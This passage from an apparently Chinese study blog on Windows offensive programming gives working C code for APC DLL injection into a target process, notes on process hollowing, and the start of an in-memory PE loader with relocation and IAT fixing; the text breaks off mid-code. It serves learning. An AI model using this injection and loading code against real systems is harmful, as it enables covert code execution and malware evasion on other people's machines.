class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">FindAllThreadId</span><span class="params">(DWORD dwPID, DWORD *dwThreadIdArr, DWORD *dwArrLenth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hshot;</span><br><span class="line">	THREADENTRY32 lpte= &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	DWORD Lenth=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	hshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (INVALID_HANDLE_VALUE == hshot)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateToolhelp32Snapshot Failed!!! %d&quot;</span>,GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RtlZeroMemory(&amp;lpte, <span class="keyword">sizeof</span>(lpte));</span><br><span class="line">	lpte.dwSize = <span class="keyword">sizeof</span>(lpte);</span><br><span class="line">	BOOL bt32f=Thread32First(hshot, &amp;lpte);</span><br><span class="line">	<span class="keyword">if</span> (bt32f == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Thread32First Failed!!!%d&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (lpte.th32OwnerProcessID == dwPID)</span><br><span class="line">		&#123;</span><br><span class="line">			dwThreadIdArr[Lenth] = lpte.th32ThreadID;</span><br><span class="line">			Lenth++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (Thread32Next(hshot, &amp;lpte));</span><br><span class="line"></span><br><span class="line">	*dwArrLenth = Lenth;</span><br><span class="line">	CloseHandle(hshot);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyAPCInjectDll</span><span class="params">(DWORD dwPID, LPCSTR szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;<span class="comment">//目标进程的句柄 </span></span><br><span class="line">	LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwBufSize = (DWORD)<span class="built_in">strlen</span>(szDllPath) + <span class="number">1</span>;</span><br><span class="line">	PVOID pThreadProc;</span><br><span class="line">	HMODULE hMod;</span><br><span class="line">	DWORD ThreadIdArr[<span class="number">1000</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">	DWORD ArrLenth = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//申请dll路径大小的空间</span></span><br><span class="line">	pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == pRemoteBuf)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//写入dll路径</span></span><br><span class="line">	<span class="keyword">if</span> (FALSE == WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory failed!!!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hMod = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	pThreadProc = (PVOID)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pThreadProc== <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress failed!!!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">false</span> == FindAllThreadId(dwPID, ThreadIdArr, &amp;ArrLenth))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;FindAllThreadId failed!!!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ArrLenth; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ThreadIdArr[i]);</span><br><span class="line">		hThread =OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadIdArr[i]);</span><br><span class="line">		<span class="keyword">if</span> (hThread)</span><br><span class="line">		&#123;</span><br><span class="line">			DWORD check=QueueUserAPC((PAPCFUNC)pThreadProc, hThread, (ULONG_PTR)pRemoteBuf);</span><br><span class="line">			<span class="keyword">if</span> (check == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;QueueUserAPC failed!!!  %d\n&quot;</span>,GetLastError());</span><br><span class="line">			&#125;</span><br><span class="line">			CloseHandle(hThread);</span><br><span class="line">			hThread = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MyAPCInjectDll(<span class="number">25944</span>, <span class="string">&quot;d://myhack64.dll&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意事项，环境需要为x64环境编译，并且dll文件也应该是64位的，发现了个奇怪的现象，对QQ.exe注入的时候，直接崩溃报错。</p>
<h2 id="第四章-启动技术"><a href="#第四章-启动技术" class="headerlink" title="第四章-启动技术"></a>第四章-启动技术</h2><p>如何启动一个进程。</p>
<h3 id="启动进程API"><a href="#启动进程API" class="headerlink" title="启动进程API"></a>启动进程API</h3><p>第一个API，WinExec。</p>
<pre><code>UINT WinExec(
  [in] LPCSTR lpCmdLine,
  [in] UINT   uCmdShow
);</code></pre>
<p>第一个参数就是指定文件路径或者cmd命令行，第二个参数就是是否显示窗口，常见的有SW_HIDE隐藏窗口并激活另一个窗口，SW_SHOWNORMAL 激活并显示一个窗口。</p>
<p>第二个API，ShellExecute。</p>
<pre><code>HINSTANCE ShellExecuteA(
  [in, optional] HWND   hwnd,
  [in, optional] LPCSTR lpOperation,
  [in]           LPCSTR lpFile,
  [in, optional] LPCSTR lpParameters,
  [in, optional] LPCSTR lpDirectory,
  [in]           INT    nShowCmd
);</code></pre>
<p>第3个参数代表文件路径，最后个参数代表窗口显示。</p>
<p>第三个API，CreateProcess，不多讲了，功能很多。</p>
<p>下面是三个函数的总合代码。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">test1</span><span class="params">(LPCSTR pszExePath, UINT uCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UINT uRet = WinExec(pszExePath, uCmdShow);</span><br><span class="line">	<span class="keyword">if</span> (uRet&lt;= <span class="number">31</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WinExec Failed !!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">test2</span><span class="params">(LPCSTR pszExePath, UINT uCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HINSTANCE hRet = ShellExecuteA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, pszExePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, uCmdShow);</span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">int</span>)hRet &lt;= <span class="number">32</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WinExec Failed !!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">test3</span><span class="params">(LPCSTR pszExePath, UINT uCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STARTUPINFOA si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));<span class="comment">//用来将指定的内存块清零。</span></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//包含wShowWindow</span></span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = uCmdShow;</span><br><span class="line">    <span class="keyword">if</span> (!CreateProcessA(</span><br><span class="line">        pszExePath,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,  <span class="comment">//不继承进程句柄</span></span><br><span class="line">        <span class="literal">NULL</span>,  <span class="comment">//不继承线程句柄</span></span><br><span class="line">        FALSE, <span class="comment">//不继承句柄 </span></span><br><span class="line">        <span class="number">0</span>,     <span class="comment">//没有创建标志，常用的有一个CREATE_SUSPENDED，立即挂起新进程。除非调用了ResumeThread函数函数，否则它不会恢复运行。可以用来干坏事。</span></span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;si,</span><br><span class="line">        &amp;pi)</span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateChildProcess Error%d&quot;</span>, GetLastError());   </span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(pi.hProcess);   <span class="comment">//关闭句柄</span></span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szFilePath[MAX_PATH] = <span class="string">&quot;C:\\Windows\\system32\\notepad.exe&quot;</span>;</span><br><span class="line">	test1(szFilePath, SW_SHOWNORMAL);</span><br><span class="line">	test2(szFilePath, SW_SHOWNORMAL);</span><br><span class="line">	test3(szFilePath, SW_SHOWNORMAL);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="内存直接加载"><a href="#内存直接加载" class="headerlink" title="内存直接加载"></a>内存直接加载</h3><p>本质就是自己用代码去加载一个DLL文件或者exe文件，不得不说，书上讲的真少，实际上过程和脱一个壳都差不多了。需要了解点PE结构的知识，PE结构嘛，无非就是一大堆结构体。</p>
<p>本过程相比于我在第七章讲的傀儡进程-PE映像切换，多了两个步骤，修改PE文件重定位表信息和填写PE文件导入表信息(IAT)。</p>
<pre><code>//《逆向工程核心原理》中都能找到两个概念的介绍
PE重定位

向进程的虚拟内存中加载PE文件时，文件会被加载到PE头的ImageBase所指的地址处，该位置存在被占用可能，此时PE装载器会将其加载到其他未被占用的空间。PE重定位指PE文件无法加载到ImageBase所指位置，而是加载到其他地址时发生的一系列行为。
创建进程后，EXE文件会首先加载到内存，所以EXE文件无需考虑重定位问题。

IAT
简单来说就是存储函数地址的结构体</code></pre>
<p>然后产生了三个问题</p>
<ul>
<li>为什么PE映像切换就不用做这两件事，就可以加载一个exe文件了呢？</li>
<li>为什么需要修改PE文件重定位表信息?</li>
<li>为什么需要填写PE文件导入表信息(IAT)?</li>
</ul>
<p>在粗略阅读下面文章后，稍微理解了一些。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/littlehann/p/3458736.html">windows进程/线程创建过程 — windows操作系统学习</a><br><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-268005-1.htm#msg_header_h3_3">[原创]PE映像切换技术(Process Hollowing)不需要填充IAT表和进行重定位的原因</a><br><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-151939.htm">[原创]为什么某些壳脱壳后需要修复IAT</a></p>
<p>然后以我自己的理解来解答下，可能并不对。</p>
<ul>
<li>第一个问题：因为我们以挂起线程调用CreateProcess()函数后，然后切换了PE映像，这两个操作都是在重新启动线程后完成的。其实我对此解释也抱着半信半疑的态度，一是根据其文章的描述不能具体看到起函数是否执行了相关操作，二是因为看了对PE重定位的概念，创建进程后，EXE文件会首先加载到内存，所以EXE文件无需考虑重定位问题。在利用CreateProcess()创建进程的前提下，对于exe文件来说，已经分配了4gb的虚拟内存，默认imagebase一般都是0x400000，不需要重定位，所以删除.reloc这个节区对程序的运行一般不会照成任何影响。</li>
<li>第二个问题：虽然说exe不需要考虑重定位问题，但是那是在创建进程的前提下，而我们手动加载一个exe文件实际上利用的是VirtualAlloc函数在本进程中再申请一段内存空间作为映像的基址，所以肯定就需要重新定位下了。</li>
<li>第三个问题，为什么要填写IAT，就是因为dll不一定都完全按照他们的imagebase来加载到相应的基地址，IAT对应的硬编码不一定就是确切的函数地址，exe加载到内存后准确的地址会取代改位置的值。所以，我们需要自己利用GetProcAddress函数来取得确切的地址，然后填入进去。</li>
</ul>
<p>下面来利用一个随便写的exe程序来感受下PE重定位和IAT，实际上都可以在《逆向工程核心原理》一书中找到相关知识点讲解。</p>
<pre><code>// Based relocation format.
//

//@[comment(&quot;MVI_tracked&quot;)]
typedef struct _IMAGE_BASE_RELOCATION &#123;
    DWORD   VirtualAddress;
    DWORD   SizeOfBlock;
//  WORD    TypeOffset[1];
&#125; IMAGE_BASE_RELOCATION;
typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;

//
// Based relocation types.
//

#define IMAGE_REL_BASED_ABSOLUTE              0
#define IMAGE_REL_BASED_HIGH                  1
#define IMAGE_REL_BASED_LOW                   2
#define IMAGE_REL_BASED_HIGHLOW               3
#define IMAGE_REL_BASED_HIGHADJ               4
#define IMAGE_REL_BASED_MACHINE_SPECIFIC_5    5
#define IMAGE_REL_BASED_RESERVED              6
#define IMAGE_REL_BASED_MACHINE_SPECIFIC_7    7
#define IMAGE_REL_BASED_MACHINE_SPECIFIC_8    8
#define IMAGE_REL_BASED_MACHINE_SPECIFIC_9    9
#define IMAGE_REL_BASED_DIR64                 10</code></pre>
<p><img src="https://s2.loli.net/2022/01/31/2CzocvpYatFVE7e.png"></p>
<p>IAT，还是贴出相关结构体。</p>
<p>IMAGE_IMPORT_DESCRIPTOR</p>
<pre><code>typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;
    union &#123;
        DWORD   Characteristics;            // 0 for terminating null import descriptor
        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)
    &#125; DUMMYUNIONNAME;
    DWORD   TimeDateStamp;                  // 0 if not bound,
                                            // -1 if bound, and real date\time stamp
                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)
                                            // O.W. date/time stamp of DLL bound to (Old BIND)

    DWORD   ForwarderChain;                 // -1 if no forwarders
    DWORD   Name;
    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)
&#125; IMAGE_IMPORT_DESCRIPTOR;
typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</code></pre>
<p>IMAGE_IMPORT_BY_NAME</p>
<pre><code>typedef struct _IMAGE_IMPORT_BY_NAME &#123;
    WORD    Hint;
    CHAR   Name[1];
&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</code></pre>
<p>我们修改的主要是IMAGE_IMPORT_DESCRIPTOR结构体中的FirstThunk，也就是IAT中的RVA。<br><img src="https://s2.loli.net/2022/01/31/umdZo97DFijMhGw.png"><br>那么如何获得相关函数的地址，然后填上去呢，我们可以利用IMAGE_IMPORT_DESCRIPTOR结构体获得dll的名称，和该程序调用了dll那些函数的名称，然后用GetProcAddress去获得函数实际地址然后填入IAT的相对应位置。并且DLL的导出函数有两种，分为函数名称导出，和序号导出，这也是个新知识点吧<a target="_blank" rel="noopener" href="https://www.xuebuyuan.com/1266850.html">https://www.xuebuyuan.com/1266850.html</a>。</p>
<p>这里多说一句，为什么会有IAT这个东西，为什么我们调用某个官方函数时，不直接调用起真实地址。原因就在于，对于不同的windows版本和DLL版本，可能这些地址是不同的，所以采取的一般方式是在程序加载时，才获取真实的函数地址到IAT中的对应位置。</p>
<p>完整代码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReadExeFile</span><span class="params">(CHAR* szNewFilePath, BYTE** buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwFileSize = <span class="number">0</span>;</span><br><span class="line">	DWORD dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line"></span><br><span class="line">	hFile = CreateFileA(szNewFilePath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateFileA Failed !!! GetLastError: %d&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">	*buffer = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ReadFile(hFile, *buffer, dwFileSize, &amp;dwNumberOfBytesRead, <span class="literal">NULL</span>) == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed !!! GetLastError: %d&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ImageWrite</span><span class="params">(LPVOID lpBaseAddress,PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">	PIMAGE_FILE_HEADER      pIFH = (PIMAGE_FILE_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">4</span>);</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">	PIMAGE_SECTION_HEADER   pISH = (PIMAGE_SECTION_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line">	DWORD dSectionNum = <span class="number">0</span>;</span><br><span class="line">	HANDLE hProcess;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	dSectionNum = pIFH-&gt;NumberOfSections;</span><br><span class="line"></span><br><span class="line">	hProcess = GetCurrentProcess();</span><br><span class="line">	<span class="comment">//写入头，头的映射无论是在内存还是在文件都是一样的。</span></span><br><span class="line">	<span class="keyword">if</span> (WriteProcessMemory(hProcess, lpBaseAddress, pbuf, pIOH-&gt;SizeOfHeaders, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span 